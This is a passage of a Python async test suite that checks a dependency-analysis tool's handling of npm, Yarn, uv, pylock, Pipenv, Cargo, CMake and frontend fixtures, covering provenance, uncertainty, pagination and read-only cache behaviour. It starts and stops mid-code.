        "Yarn physical descriptors or conditional context were lost",
    )
    check(
        yarn["resolved_versions"] == []
        and not yarn["usages"]
        and not yarn["findings"]
        and not yarn["evidence_complete"]
        and not yarn["usage_complete"]
        and yarn_impact["usage_count"] == 0
        and not yarn_impact["evidence_complete"]
        and yarn_before == (yarn_cache.read_bytes(), yarn_cache.stat().st_mtime_ns),
        "Yarn inventory became an installed application graph or changed the query cache",
    )
    passed.append("yarn-lock-inventory-preserves-unknown-ownership")


async def _check_queries_and_previews(root, call, passed, fixtures):
    await call("index_repository", "npm")
    cache = root / "npm" / ".depcheck" / "index.sqlite3"
    cache_before = (cache.read_bytes(), cache.stat().st_mtime_ns)
    npm = await call("explain_dependency", "npm", package="lodash")
    impact = await call("dependency_impact", "npm", package="lodash")
    check(npm["resolved_versions"] == [], "Range treated as an exact resolution")
    check(
        impact["usage_count"] == 1 and impact["files"] == ["app.js"],
        "Lost usage",
    )
    passed.append("default-npm-index-without-lock")
    await call("index_repository", "evidence-pages")
    lines = []
    evidence_offset = 0
    while evidence_offset is not None:
        page = await call(
            "explain_dependency",
            "evidence-pages",
            package="lib",
            evidence_limit=20,
            evidence_offset=evidence_offset,
        )
        check(
            page["evidence_page"]["counts"]["usages"] == 65,
            "Evidence count lost full inventory",
        )
        lines.extend(u["location"]["line"] for u in page["usages"])
        evidence_offset = page["evidence_page"]["next_offset"]
    check(
        lines == list(range(1, 66)),
        "Evidence pagination omitted or repeated usages",
    )
    passed.append("bounded-nested-evidence-pagination")
    await call("index_repository", "python-source")
    sourced = await call("explain_dependency", "python-source", package="requests")
    check(
        sourced["purl"] is None
        and not sourced["evidence_complete"]
        and sourced["resolutions"][0]["origin"]["kind"] == "editable",
        "Local Python source became a public registry identity",
    )
    passed.append("python-source-provenance")
    await call("index_repository", "origins")
    origin = await call(
        "explain_dependency",
        "origins",
        package="child",
        origin_limit=1,
        origin_depth=1,
    )
    check(
        origin["origins"]["truncated"] and not origin["origins"]["complete"],
        "Depth limit lost origin uncertainty",
    )
    origin = await call("explain_dependency", "origins", package="child")
    check(
        origin["origins"]["complete"]
        and [n["package"] for n in origin["origins"]["paths"][0]["nodes"]]
        == ["parent", "child"],
        "Qualified origin path lost its direct owner",
    )
    passed.append("bounded-qualified-dependency-origins")
    component = await call("scan_repository", "component-regions")
    check(
        component["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and component["inventory"]["usage_count"] == 2,
        "Component regions lost imports or template uncertainty",
    )
    passed.append("vue-svelte-literal-regions")
    workspace = await call("scan_repository", "uv-workspace")
    check(
        any(p["project_id"] == "pypi:python:member" for p in workspace["projects"])
        and any(
            d["code"] == "resolution.uv-workspace-activation-unknown"
            for d in workspace["diagnostics"]
        ),
        "uv member ownership lost shared activation uncertainty",
    )
    passed.append("uv-member-ownership-and-activation")
    workspace_cache = root / "uv-workspace/.depcheck/index.sqlite3"
    workspace_before = workspace_cache.read_bytes(), workspace_cache.stat().st_mtime_ns
    inherited = await call(
        "explain_dependency",
        "uv-workspace",
        package="requests",
        project_id="pypi:python:member",
    )
    overridden = await call(
        "explain_dependency",
        "uv-workspace",
        package="requests",
        project_id="pypi:python:override",
    )
    row = inherited["resolutions"][0]
    check(
        row["origin"]["kind"] == "git"
        and row["origin"]["public"] is False
        and row["metadata"]["inherited_uv_source"]["configuration_file"]
        == "pyproject.toml"
        and row["metadata"]["inherited_uv_source"]["membership"] == "confirmed"
        and overridden["resolutions"][0]["origin"]["kind"] == "path"
        and "inherited_uv_source" not in overridden["resolutions"][0]["metadata"]
        and (workspace_cache.read_bytes(), workspace_cache.stat().st_mtime_ns)
        == workspace_before,
        "uv root source assertions or conditional member override lost precedence or changed the cache",
    )
    workspace_manifest = root / "uv-workspace/pyproject.toml"
    workspace_manifest.write_text(
        workspace_manifest.read_text().replace(
            "example.invalid/root", "example.invalid/changed"
        )
    )
    workspace_context = await call("repository_context", "uv-workspace")
    check(
        workspace_context["stale"]
        and (workspace_cache.read_bytes(), workspace_cache.stat().st_mtime_ns)
        == workspace_before,
        "Changed inherited uv source policy did not invalidate selected evidence read-only",
    )
    await call("index_repository", "uv-workspace")
    refreshed = await call(
        "explain_dependency",
        "uv-workspace",
        package="requests",
        project_id="pypi:python:member",
    )
    check(
        refreshed["resolutions"][0]["origin"]["assertion"]["git"]
        == "https://example.invalid/changed",
        "Explicit refresh retained outdated inherited uv source policy",
    )
    passed.append("uv-workspace-source-policy-retains-member-overrides-and-freshness")
    profile = await call("scan_repository", "uv-source-profile")
    profile_row = profile["inventory"]["resolved_dependencies"][0]
    check(
        profile_row["origin"]["public"] is False
        and profile_row["metadata"]["uv_source_status"] == "unverified"
        and any(
            d["code"] == "manifest.uv-source-table-unverified"
            for d in profile["diagnostics"]
        ),
        "Malformed uv source table became a public default",
    )
    profile_cache = root / "uv-source-profile/.depcheck/index.sqlite3"
    profile_before = profile_cache.read_bytes(), profile_cache.stat().st_mtime_ns
    profile_query = await call(
        "explain_dependency", "uv-source-profile", package="requests"
    )
    check(
        profile_query["resolutions"][0]["origin"] == profile_row["origin"]
        and (profile_cache.read_bytes(), profile_cache.stat().st_mtime_ns)
        == profile_before,
        "Source qualification was lost or read-only query changed the index",
    )
    profile_manifest = root / "uv-source-profile/pyproject.toml"
    profile_manifest.write_text(
        '[project]\nname="app"\nversion="1"\ndependencies=["requests==2.31.0"]\n[tool.uv.sources]\nrequests=[{git="https://example.invalid/one",marker="sys_platform == \'darwin\'"},{path="vendor/requests",marker="sys_platform != \'darwin\'"}]\n'
    )
    await call("index_repository", "uv-source-profile")
    profile_after = await call(
        "explain_dependency", "uv-source-profile", package="requests"
    )
    assertion = profile_after["resolutions"][0]["origin"]["assertion"]
    check(
        len(assertion) == 2
        and {a["marker"] for a in assertion}
        == {"sys_platform == 'darwin'", "sys_platform != 'darwin'"}
        and profile_after["resolutions"][0]["origin"]["public"] is False,
        "uv source alternatives were selected by the analysis host or lost on refresh",
    )
    passed.append("uv-source-profile-unknown-and-conditional-evidence")
    pylock_scan = await call("scan_repository", "pylock-coverage")
    check(
        any(
            d["code"] == "resolution.pylock-activation-unknown"
            for d in pylock_scan["diagnostics"]
        ),
        "pylock was silently ignored",
    )
    pylock_cache = root / "pylock-coverage/.depcheck/index.sqlite3"
    pylock_before = pylock_cache.read_bytes(), pylock_cache.stat().st_mtime_ns
    pylock_query = await call(
        "explain_dependency", "pylock-coverage", package="requests"
    )
    check(
        not pylock_query["evidence_complete"]
        and pylock_query["resolved_versions"] == ["2.31.0"]
        and (pylock_cache.read_bytes(), pylock_cache.stat().st_mtime_ns)
        == pylock_before,
        "pylock gap or read-only query boundary lost",
    )
    (root / "pylock-coverage/pylock.ci.toml").unlink()
    pylock_context = await call("repository_context", "pylock-coverage")
    check(
        pylock_context["stale"]
        and (pylock_cache.read_bytes(), pylock_cache.stat().st_mtime_ns)
        == pylock_before,
        "removed pylock did not mark the snapshot stale read-only",
    )
    await call("index_repository", "pylock-coverage")
    pylock_context = await call("repository_context", "pylock-coverage")
    pylock_refreshed = await call(
        "explain_dependency", "pylock-coverage", package="requests"
    )
    check(
        not pylock_context["stale"]
        and not any(
            g["reason"] == "resolution.pylock-activation-unknown"
            for g in pylock_context["coverage"]["uncovered"]
        )
        and pylock_refreshed["resolved_versions"] == ["2.31.0"],
        "explicit refresh retained deleted pylock gap or changed declared versions",
    )
    passed.append("pylock-input-coverage-and-readonly-freshness")
    native_pylock = await call("scan_repository", "pylock-inventory")
    native_rows = native_pylock["inventory"]["resolved_dependencies"]
    check(
        len(native_rows) == 1
        and native_rows[0]["identity"]["version"] == "2.31.0"
        and native_rows[0]["metadata"]["lock_format"] == "pylock",
        "native pylock failed to retain known versions",
    )
    native_cache = root / "pylock-inventory/.depcheck/index.sqlite3"
    native_before = native_cache.read_bytes(), native_cache.stat().st_mtime_ns
    native_query = await call(
        "explain_dependency", "pylock-inventory", package="requests"
    )
    tree_query = await call("explain_dependency", "pylock-inventory", package="child")
    native_context = await call("repository_context", "pylock-inventory")
    native_metadata = native_query["resolutions"][0]["metadata"]
    check(
        native_metadata["informational_dependencies"][0]["target_package_indices"]
        == [1]
        and native_metadata["dependency_status"] == "informational-only"
        and not native_query["evidence_complete"]
        and tree_query["resolved_versions"] == []
        and "resolutions" not in tree_query
        and tree_query["declarations"][0]["metadata"]["source_pointer"] == "/packages/1"
        and not native_context["stale"]
        and (native_cache.read_bytes(), native_cache.stat().st_mtime_ns)
        == native_before,
        "native pylock selected an environment, invented a source-tree version, lost informational references or mutated the index",
    )
    passed.append("native-pylock-inventory-unknown-versions-and-informational-edges")
    index_scan = await call("scan_repository", "uv-index-policy")
    index_rows = index_scan["inventory"]["resolved_dependencies"]
    check(
        len(index_rows) == 1
        and index_rows[0]["origin"]["public"] is False
        and index_rows[0]["metadata"]["uv_index_policy"]["configuration"]["path"]
        == "uv.toml",
        "Workspace uv.toml or legacy extra index did not qualify the member source",
    )
    index_cache = root / "uv-index-policy/.depcheck/index.sqlite3"
    index_before = index_cache.read_bytes(), index_cache.stat().st_mtime_ns
    index_query = await call(
        "explain_dependency",
        "uv-index-policy",
        package="requests",
        project_id="pypi:python:member",
    )
    check(
        index_query["resolutions"][0]["metadata"] == index_rows[0]["metadata"]
        and (index_cache.read_bytes(), index_cache.stat().st_mtime_ns) == index_before,
        "Index policy metadata or read-only query contract changed",
    )
    index_file = root / "uv-index-policy/uv.toml"
    index_file.write_text("")
    index_context = await call("repository_context", "uv-index-policy")
    check(
        index_context["stale"]
        and (index_cache.read_bytes(), index_cache.stat().st_mtime_ns) == index_before,
        "Changed uv.toml did not invalidate inherited evidence read-only",
    )
    await call("index_repository", "uv-index-policy")
    index_refreshed = await call(
        "explain_dependency",
        "uv-index-policy",
        package="requests",
        project_id="pypi:python:member",
    )
    check(
        index_refreshed["resolutions"][0]["origin"]["public"] is True
        and index_refreshed["resolutions"][0]["metadata"]["uv_index_policy"][
            "selection"
        ]
        == "uv-toml",
        "Empty selected uv.toml incorrectly fell back to ignored private pyproject or member configuration",
    )
    passed.append("uv-index-policy-precedence-and-readonly-refresh")
    uv_forks = await call("scan_repository", "python-uv-forks")
    uv_cache = root / "python-uv-forks/.depcheck/index.sqlite3"
    uv_before = uv_cache.read_bytes(), uv_cache.stat().st_mtime_ns
    uv_explanation = await call(
        "explain_dependency", "python-uv-forks", package="requests"
    )
    uv_impact = await call("dependency_impact", "python-uv-forks", package="requests")
    check(
        uv_explanation["resolved_versions"] == ["2.31.0", "2.32.0"]
        and len({r["instance"] for r in uv_explanation["resolutions"]}) == 2
        and all(
            r["origin"]["lock"]["conditional"] for r in uv_explanation["resolutions"]
        )
        and {r["metadata"]["package_index"] for r in uv_explanation["resolutions"]}
        == {0, 1}
        and all(
            r["metadata"]["activation"] == "unknown"
            for r in uv_explanation["resolutions"]
        )
        and not uv_explanation["evidence_complete"]
        and uv_impact["usage_count"] == 1
        and any(
            d["code"] == "resolution.uv-lock-selection-unknown"
            for d in uv_forks["diagnostics"]
        ),
        "uv lock branches became one active environment or lost their conditions",
    )
    check(
        (uv_cache.read_bytes(), uv_cache.stat().st_mtime_ns) == uv_before,
        "uv fork queries changed the derived index",
    )
    passed.append("uv-lock-branches-retain-unknown-activation")
    bound_scan = await call("scan_repository", "python-bindings")
    bound_rows = bound_scan["inventory"]["resolved_dependencies"]
    check(
        len(bound_rows) == 4
        and sum(row["direct"] for row in bound_rows) == 1
        and any(
            row["identity"]["version"] == "1.0.0"
            and row["origin"]["public"] is True
            and row["direct"]
            and row["metadata"]["directness_status"] == "matched-declaration"
            for row in bound_rows
        )
        and any(
            d["code"] == "resolution.python-directness-unknown"
            for d in bound_scan["diagnostics"]
        ),
        "Python directness ignored version/source evidence or erased an unmatched declaration",
    )
    bound_cache = root / "python-bindings/.depcheck/index.sqlite3"
    bound_before = bound_cache.read_bytes(), bound_cache.stat().st_mtime_ns
    bound = await call("explain_dependency", "python-bindings", package="foo")
    check(
        len(bound["resolutions"]) == 3
        and {row["instance"]: row["metadata"] for row in bound["resolutions"]}
        == {
            row["identity"]["instance"]: row["metadata"]
            for row in bound_rows
            if row["identity"]["package"] == "foo"
        }
        and (bound_cache.read_bytes(), bound_cache.stat().st_mtime_ns) == bound_before,
        "Read-only Python queries lost occurrence binding metadata or changed the cache",
    )
    await call("index_repository", "python-bindings")
    bound_again = await call("explain_dependency", "python-bindings", package="foo")
    check(
        bound_again["resolutions"] == bound["resolutions"],
        "Python refresh changed unchanged direct binding evidence",
    )
    passed.append(
        "python-direct-bindings-retain-versions-origins-and-read-only-context"
    )
    check(
        (cache.read_bytes(), cache.stat().st_mtime_ns) == cache_before,
        "Read-only MCP queries changed the index",
    )
    passed.append("read-only-tool-contracts")

    frontend = await call("scan_repository", "frontend")
    check(
        frontend["capabilities"]["dependency_hygiene"]["state"] == "complete",
        "Literal Astro/CSS evidence remained unsupported",
    )
    font = await call("explain_dependency", "frontend", package="font")
    check(
        font["usages"][0]["reference"] == "font/style.css"
        and font["usages"][0]["mapping_confidence"] == "exact"
        and font["usages"][0]["location"]
        == {"path": "Page.astro", "line": 2, "column": 8},
        "Astro import lost package mapping",
    )
    theme = await call("dependency_impact", "frontend", package="theme")
    check(
        theme["usage_count"] == 1 and theme["files"] == ["global.css"],
        "CSS impact lost its source",
    )
    passed.append("literal-astro-css-evidence")
    (root / "frontend" / "Page.astro").write_text(
        fixtures["frontend"]["Page.astro"] + "<div>{import(name)}</div>\n"
    )
    check(
        (await call("repository_context", "frontend"))["stale"],
        "Astro changes did not invalidate cached evidence",
    )
    frontend_partial = await call("scan_repository", "frontend")
    check(
        frontend_partial["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and not any(
            f["code"] == "dependency.unused" for f in frontend_partial["findings"]
        )
        and any(
            d["code"] == "usage.unsupported-astro-syntax"
            for d in frontend_partial["diagnostics"]
        ),
        "Unparsed Astro expressions established an unused dependency",
    )
    passed.append("astro-uncertainty-and-refresh")

    uncertain = await call("scan_repository", "frontend-uncertain")
    explanation = await call(
        "explain_dependency", "frontend-uncertain", package="theme"
    )
    check(
        uncertain["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and any(
            d["code"] == "usage.unsupported-css-scope" for d in uncertain["diagnostics"]
        )
        and not any(
            f["code"] == "dependency.scope-mismatch" for f in uncertain["findings"]
        )
        and explanation["usages"][0]["scope"] == "unknown"
        and not explanation["usage_complete"],
        "CSS imports without a build context established runtime scope",
    )
    passed.append("css-scope-uncertainty")

    locks = await call("scan_repository", "lock-ambiguous")
    locked = await call("explain_dependency", "lock-ambiguous", package="tool")
    check(
        locks["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and "resolution.package-manager-ambiguous"
        in locks["context"]["incomplete_reasons"]
        and locked["resolved_versions"] == []
        and not locked["evidence_complete"],
        "Conflicting lockfiles supplied an unqualified resolved graph",
    )
    passed.append("ambiguous-lock-graphs")

    await call("index_repository", "pages")
    names = []
    offset = 0
    while True:
        page = await call("query_dependencies", "pages", limit=20, offset=offset)
        names.extend(item["package"] for item in page["dependencies"])
        if not page["truncated"]:
            check(page["next_offset"] is None, "Unexpected next page")
            break
        check(page["next_offset"] > offset, "Pagination did not advance")
        offset = page["next_offset"]
    check(
        names == [f"package-{i:03d}" for i in range(65)],
        "Missing/duplicate packages",
    )
    passed.append("complete-paginated-inventory")

    await call("index_repository", "ambiguous")
    ambiguous = await call("explain_dependency", "ambiguous", package="shared")
    check(ambiguous["error"]["code"] == "dependency.ambiguous", "Lost ambiguity")
    chosen = next(
        item
        for item in ambiguous["error"]["choices"]
        if item["project_id"] == "npm:npm:two"
    )
    qualified = await call(
        "explain_dependency",
        "ambiguous",
        **{key: chosen[key] for key in ("project_id", "ecosystem", "package")},
    )
    check(qualified["project_id"] == "npm:npm:two", "Wrong project selected")
    passed.append("qualified-ambiguous-identity")

    preview = await call(
        "plan_dependency_updates", "preview", updates={"requests": "2.32.4"}
    )
    check(preview["plans"] == [], "Unsupported preview produced a plan")
    check(
        preview["diagnostics"][0]["code"] == "update.unsupported-target",
        "Missing unsupported-target diagnostic",
    )
    check(
        (root / "preview" / "pyproject.toml").read_text()
        == fixtures["preview"]["pyproject.toml"],
        "Preview changed the manifest",
    )
    passed.append("unsupported-preview-is-not-noop")
    explicit = await call(
        "plan_dependency_updates",
        "preview",
        updates={"requests": "2.32.4"},
        target_file="pyproject.toml",
        group="project",
    )
    check(explicit["plans"][0]["groups"] == ["project"], "Wrong explicit group")
    check("2.32.4" in explicit["plans"][0]["preview"], "Missing pyproject preview")
    passed.append("explicit-pyproject-preview")
    explicit_noop = await call(
        "plan_dependency_updates",
        "preview",
        updates={"requests": "2.31.0"},
        target_file="pyproject.toml",
        group="project",
    )
    check(
        not explicit_noop["plans"] and not explicit_noop["diagnostics"],
        "Pyproject noop failed",
    )
    passed.append("explicit-pyproject-noop")
    for folder, code in [
        ("preview-ambiguous", "update.ambiguous-target"),
        ("preview-url", "update.unsupported-target"),
    ]:
        rejected = await call(
            "plan_dependency_updates",
            folder,
            updates={"requests": "2"},
            target_file="pyproject.toml",
        )
        check(
            not rejected["plans"] and rejected["diagnostics"][0]["code"] == code,
            "Incorrect pyproject rejection",
        )
        passed.append(folder)
    for folder in ("preview", "preview-ambiguous", "preview-url"):
        check(
            (root / folder / "pyproject.toml").read_bytes()
            == fixtures[folder]["pyproject.toml"].encode(),
            "Pyproject preview wrote target",
        )

    noop = await call(
        "plan_dependency_updates", "python", updates={"requests": "2.31.0"}
    )
    check(
        not noop["plans"] and not noop["diagnostics"],
        "No-op treated as failure",
    )
    passed.append("supported-preview-noop")


async def _check_build_configuration(root, call, passed):
    await call("scan_repository", "tool")
    tool = await call("explain_dependency", "tool", package="ruff")
    check(not tool["findings"], "Tool use reported as unused")
    check(
        not tool["imports"] and not tool["imported"],
        "Tool use became an import",
    )
    check(
        tool["usages"][0]["kind"] == "tool"
        and tool["usages"][0]["mapping_confidence"] == "configured"
        and tool["usages"][0]["mapping_reason"] == "CI lint",
        "Tool explanation lost configured provenance",
    )
    passed.append("configured-tool-usage")

    await call("scan_repository", "command")
    command = await call(
        "explain_dependency", "command", package="vitest", ecosystem="npm"
    )
    check(
        command["imports"] == [] and command["usages"][0]["kind"] == "command",
        "Static command was reported as a source import",
    )
    check(
        command["usages"][0]["mapping_confidence"] == "exact",
        "Command mapping lost provenance",
    )
    command_impact = await call(
        "dependency_impact", "command", package="vitest", ecosystem="npm"
    )
    check(command_impact["usage_count"] == 1, "Impact omitted static command use")
    passed.append("static-command-provenance")

    cpp_scan = await call("scan_repository", "cpp-preprocessor")
    check(
        not any(
            f["code"] in {"dependency.missing", "dependency.scope-mismatch"}
            for f in cpp_scan["findings"]
        ),
        "C/C++ comment or conditional include became a hygiene finding",
    )
    cpp = await call(
        "explain_dependency",
        "cpp-preprocessor",
        package="gtest",
        ecosystem="Conan",
    )
    check(
        len(cpp["usages"]) == 1
        and cpp["usages"][0]["kind"] == "conditional"
        and cpp["usages"][0]["mapping_confidence"] == "inferred"
        and cpp["usages"][0]["location"]["line"] == 5
        and cpp["usages"][0]["location"]["column"] == 3
        and not cpp["usage_complete"],
        "Conditional C/C++ include lost its position or unknown activation",
    )
    cpp_impact = await call(
        "dependency_impact",
        "cpp-preprocessor",
        package="gtest",
        ecosystem="Conan",
    )
    check(
        cpp_impact["usage_count"] == 1 and not cpp_impact["evidence_complete"],
        "C/C++ impact lost conditional evidence or claimed completeness",
    )
    passed.append("cpp-preprocessor-evidence-is-qualified")

    cargo_scan = await call("scan_repository", "cargo")
    check(
        not cargo_scan["context"]["complete"],
        "Cargo usage was treated as complete",
    )
    cargo = await call(
        "explain_dependency",
        "cargo",
        package="foo",
        ecosystem="Cargo",
        project_id="cargo:cargo:.",
    )
    check(
        cargo["resolved_versions"] == ["1.2.3"]
        and cargo["resolutions"][0]["origin"]["public"] is True
        and cargo["resolutions"][0]["metadata"]["activation"] == "unknown"
        and cargo["resolutions"][0]["metadata"]["cargo_kind"] == "lock-record"
        and not cargo["usage_complete"]
        and len(cargo["usages"]) == 1
        and cargo["usages"][0]["mapping_confidence"] == "inferred"
        and cargo["usages"][0]["scope"] == "unknown",
        "Cargo inventory lost its usage qualification",
    )
    cargo_impact = await call(
        "dependency_impact", "cargo", package="foo", ecosystem="Cargo"
    )
    check(
        cargo_impact["usage_count"] == 1 and not cargo_impact["evidence_complete"],
        "Cargo impact inferred source non-use",
    )
    passed.append("cargo-inventory-and-rust-references-are-qualified")

    cargo_legacy_scan = await call("scan_repository", "cargo-legacy")
    cargo_legacy = await call(
        "explain_dependency",
        "cargo-legacy",
        package="foo",
        ecosystem="Cargo",
        project_id="cargo:cargo:.",
    )
    cargo_rejected = await call(
        "explain_dependency",
        "cargo-legacy",
        package="bar",
        ecosystem="Cargo",
        project_id="cargo:cargo:new",
    )
    check(
        cargo_legacy_scan["inventory"]["declaration_count"] == 4
        and [d["kind"] for d in cargo_legacy["declarations"]]
        == ["direct", "configuration"]
        and cargo_legacy["declarations"][1]["metadata"]["legacy_section"]["status"]
        == "ignored"
        and cargo_rejected["declarations"][0]["metadata"]["legacy_section"]["status"]
        == "rejected"
        and not cargo_rejected["evidence_complete"]
        and any(
            d["code"] == "manifest.cargo-legacy-section"
            for d in cargo_legacy_scan["diagnostics"]
        ),
        "Cargo legacy aliases lost precedence/edition qualification in indexed queries",
    )
    passed.append("cargo-legacy-sections-preserve-edition-and-precedence")

    positioned = await call("scan_repository", "toml-locations")
    member_declarations = [
        d
        for d in positioned["inventory"]["declarations"]
        if d["project_id"] == "cargo:cargo:member"
    ]
    check(
        [
            (d["package"]["name"], d["location"]["line"], d["location"]["column"])
            for d in member_declarations
        ]
        == [("foo", 6, 1), ("bar", 7, 1)],
        "Dotted boolean workspace declarations lost their own source locations",
    )
    positioned_cache = root / "toml-locations/.depcheck/index.sqlite3"
    positioned_before = (
        positioned_cache.read_bytes(),
        positioned_cache.stat().st_mtime_ns,
    )
    positioned_foo = await call(
        "explain_dependency",
        "toml-locations",
        package="foo",
        ecosystem="Cargo",
        project_id="cargo:cargo:member",
    )
    check(
        positioned_foo["declarations"][0]["location"]
        == {"path": "member/Cargo.toml", "line": 6, "column": 1}
        and positioned_foo["declarations"][0]["metadata"]["workspace_origin"]
        == {"path": "Cargo.toml", "line": 4, "column": 1}
        and (positioned_cache.read_bytes(), positioned_cache.stat().st_mtime_ns)
        == positioned_before,
        "Positioned declarations changed inherited provenance or mutated the read-only cache",
    )
    passed.append("toml-locations-boolean-workspace-and-readonly-provenance")

    cargo_root = root / "cargo-workspace-patch"
    cargo_inputs = {
        path: (path.read_bytes(), path.stat().st_mtime_ns)
        for path in (
            cargo_root / "Cargo.toml",
            cargo_root / "Cargo.lock",
            cargo_root / "member/Cargo.toml",
            cargo_root / "member/src/lib.rs",
        )
    }
    patched_scan = await call("scan_repository", "cargo-workspace-patch")
    member_id = "cargo:cargo:member"
    member_declarations = {
        item["package"]["name"]: item
        for item in patched_scan["inventory"]["declarations"]
        if item["project_id"] == member_id
    }
    scanned_foo = next(
        item
        for item in patched_scan["inventory"]["resolved_dependencies"]
        if item["identity"]["project_id"] == member_id
        and item["identity"]["package"] == "foo"
    )
    check(
        member_declarations["foo"]["metadata"]["directness_status"] == "unknown"
        and "cargo_override_status" not in member_declarations["bar"]["metadata"]
        and all(
            any(
                d["code"] == "resolution.cargo-constraint-mismatch"
                and f"'{package}'" in d["message"]
                for d in patched_scan["diagnostics"]
            )
            for package in ("bar", "baz")
        )
        and not any(
            d["code"] == "resolution.cargo-source-mismatch" and "'foo'" in d["message"]
            for d in patched_scan["diagnostics"]
        ),
        "Cargo root patch lost member scope, applied to an unrelated source, or hid a definite range conflict",
    )
    patched_cache = cargo_root / ".depcheck/index.sqlite3"
    patched_before = patched_cache.read_bytes(), patched_cache.stat().st_mtime_ns
    patched = await call(
        "explain_dependency",
        "cargo-workspace-patch",
        package="foo",
        ecosystem="Cargo",
        project_id=member_id,
    )
    (declaration,) = patched["declarations"]
    (resolution,) = patched["resolutions"]
    provenance = declaration["metadata"]["cargo_overrides"]["first"]
    check(
        patched["project_id"] == member_id
        and declaration["metadata"] == member_declarations["foo"]["metadata"]
        and declaration["constraint"]["raw"] == "=1.0.0"
        and declaration["location"]["path"] == "member/Cargo.toml"
        and declaration["location"]["line"] == 6
        and provenance["location"]["path"] == "Cargo.toml"
        and provenance["location"]["line"] == 4
        and provenance["patched_source"] == "crates-io"
        and resolution["version"] == "1.0.0"
        and not scanned_foo["direct"]
        and resolution["instance"] == scanned_foo["identity"]["instance"]
        and resolution["metadata"] == scanned_foo["metadata"]
        and resolution["origin"] == scanned_foo["origin"]
        and resolution["origin"]["public"] is False
        and resolution["origin"]["assertion"]["source"]
        == "git+https://example.invalid/patched-foo#abcd"
        and resolution["metadata"]["directness_status"] == "unknown"
        and resolution["metadata"]["activation"] == "unknown"
        and patched["purl"] is None
        and not patched["evidence_complete"]
        and patched_before
        == (patched_cache.read_bytes(), patched_cache.stat().st_mtime_ns),
        "Cargo member query lost root provenance, changed lock identity, or mutated the cache",
    )
    await call("index_repository", "cargo-workspace-patch")
    refreshed_before = patched_cache.read_bytes(), patched_cache.stat().st_mtime_ns
    patched_again = await call(
        "explain_dependency",
        "cargo-workspace-patch",
        package="foo",
        ecosystem="Cargo",
        project_id=member_id,
    )
    check(
        patched_again["declarations"] == patched["declarations"]
        and patched_again["resolutions"] == patched["resolutions"]
        and refreshed_before
        == (patched_cache.read_bytes(), patched_cache.stat().st_mtime_ns)
        and all(
            (path.read_bytes(), path.stat().st_mtime_ns) == state
            for path, state in cargo_inputs.items()
        ),
        "Cargo refresh lost override context or read-only queries changed captured inputs",
    )
    passed.append("cargo-workspace-root-patch-survives-member-indexed-queries")

    cmake = await call("scan_repository", "cmake")
    check(
        not cmake["context"]["complete"],
        "CMake activation was treated as complete",
    )
    cmake_record = await call(
        "explain_dependency",
        "cmake",
        package="googletest",
        ecosystem="CMake",
        project_id="cmake:cmake:.",
    )
    check(
        cmake_record["purl"] is None and cmake_record["resolved_versions"] == [],
        "CMake source assertions became package-manager coordinates or installed versions",
    )
    check(
        cmake_record["declarations"][0]["location"]["path"] == "deps.cmake"
        and cmake_record["declarations"][0]["metadata"]["activation"] == "unknown"
        and cmake_record["usages"][0]["kind"] == "configuration",
        "CMake declaration position or configuration provenance was lost",
    )
    cmake_impact = await call(
        "dependency_impact", "cmake", package="googletest", ecosystem="CMake"
    )
    check(
        not cmake_impact["evidence_complete"],
        "CMake impact inferred complete source usage",
    )
    passed.append("cmake-configuration-inventory-is-qualified")

    script = await call("scan_repository", "cmake-script")
    check(
        any(
            d["code"] == "manifest.unsupported-cmake-command"
            for d in script["diagnostics"]
        ),
        "Uncollected CPM calls disappeared from script coverage",
    )
    check(
        {p["project_id"] for p in script["context"]["projects"]}
        == {"cmake:cmake-script:.", "cmake:cmake:app"}
        and not script["context"]["complete"],
        "CMake script scope absorbed a project or reported complete coverage",
    )
    ambiguous = await call(
        "explain_dependency",
        "cmake-script",
        package="SHARED",
        ecosystem="CMake",
    )
    check(
        ambiguous["error"]["code"] == "dependency.ambiguous",
        "CMake component ambiguity was lost",
    )
    script_record = await call(
        "explain_dependency",
        "cmake-script",
        package="SHARED",
        ecosystem="CMake",
        project_id="cmake:cmake-script:.",
    )
    check(
        script_record["declarations"][0]["location"]["path"] == "fetch.cmake"
        and script_record["resolved_versions"] == []
        and script_record["purl"] is None,
        "Script explanation lost ownership or guessed a package identity",
    )
    script_impact = await call(
        "dependency_impact",
        "cmake-script",
        package="SHARED",
        ecosystem="CMake",
        project_id="cmake:cmake-script:.",
    )
    check(
        not script_impact["evidence_complete"],
        "Script impact inferred complete source usage",
    )
    passed.append("cmake-script-scope-is-qualified")


async def _check_native_packages_and_ownership(root, call, passed):
    private = await call("scan_repository", "pipenv-private")
    check(
        not private["context"]["complete"],
        "Private Pipenv identity was treated as verified",
    )
    private_record = await call(
        "explain_dependency",
        "pipenv-private",
        package="requests",
        ecosystem="PyPI",
    )
    check(
        private_record["purl"] is None
        and private_record["resolved_versions"] == ["2.31.0"]
        and private_record["declarations"][0]["location"]["line"] == 7
        and private_record["declarations"][0]["metadata"]["origin"]["public"] is False,
        "Pipenv declaration lost its position, static pin or unverified origin",
    )
    private_impact = await call(
        "dependency_impact",
        "pipenv-private",
        package="requests",
        ecosystem="PyPI",
    )
    check(
        not private_impact["evidence_complete"],
        "Private source identity became complete impact evidence",
    )
    passed.append("pipenv-private-source-and-position-preserved")

    category_scan = await call("scan_repository", "pipenv-categories")
    check(
        not category_scan["context"]["complete"],
        "Pipenv category selection became complete",
    )
    category_record = await call(
        "explain_dependency", "pipenv-categories", package="requests", ecosystem="PyPI"
    )
    rows = category_record["resolutions"]
    check(
        len(rows) == 2 and len({row["instance"] for row in rows}) == 2,
        "Pipenv category occurrences merged",
    )
    check(
        {row["metadata"]["source_pointer"] for row in rows}
        == {"/default/requests", "/deploy/requests"},
        "Pipenv JSON pointers lost",
    )
    check(
        all(
            row["metadata"]["activation"] == "unknown"
            and row["metadata"]["dependency_status"] == "uncollected"
            for row in rows
        ),
        "Pipenv flat inventory became selected dependency graph",
    )
    custom = next(
        row
        for row in category_record["declarations"]
        if row["metadata"].get("category_kind") == "custom"
    )
    check(
        custom["scope"] == "unknown" and custom["kind"] == "conditional",
        "Pipenv custom category was treated as a runtime/development scope",
    )
    await call("index_repository", "pipenv-categories")
    again = await call(
        "explain_dependency", "pipenv-categories", package="requests", ecosystem="PyPI"
    )
    check(
        again["resolutions"] == rows, "Pipenv incremental cache lost category context"
    )
    passed.append("pipenv-category-occurrences-and-unknown-activation")

    conan = await call("scan_repository", "conan-contexts")
    check(
